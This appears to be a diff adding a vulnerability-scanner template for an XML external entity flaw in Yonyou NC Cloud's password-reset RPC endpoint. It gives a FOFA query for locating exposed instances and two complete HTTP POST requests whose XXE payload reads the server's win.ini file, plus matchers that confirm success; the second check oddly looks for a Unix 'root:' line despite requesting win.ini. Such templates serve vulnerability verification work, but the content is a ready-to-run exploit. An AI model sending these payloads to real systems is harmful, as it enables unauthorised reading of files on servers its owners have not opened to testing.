@@ -1,0 +1,47 @@
+## id: VEID-2024-0103
+## name: 用友NC_CLOUD_smartweb2.RPC.d_XML外部实体注入
+## author: hack007x
+## severity: high
+## tags: veid,XXE,veid2024
+## description:用友NC_CLOUD存在XXE
+## fofa-query: app="用友-UFIDA-NC"
+## verification: true
+
+
+
+
+
+POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
+
+
+#@ condition: and
+#@ stop_scan: true
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "xml"
+#@ matcher: body contains "[fonts]" && body contains "[extensions]"
+
+---
+
+POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
+
+#@ condition: and
+#@ stop_scan: true
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "html"
+#@ matcher: body matches /root:[^\n]+/
+
+
+
+
+
+# @VEIL-STAMP: 334e1b182afb536a7a987ee73e8aaf8b99369613aa71625ecc1be6d3c6fc6751
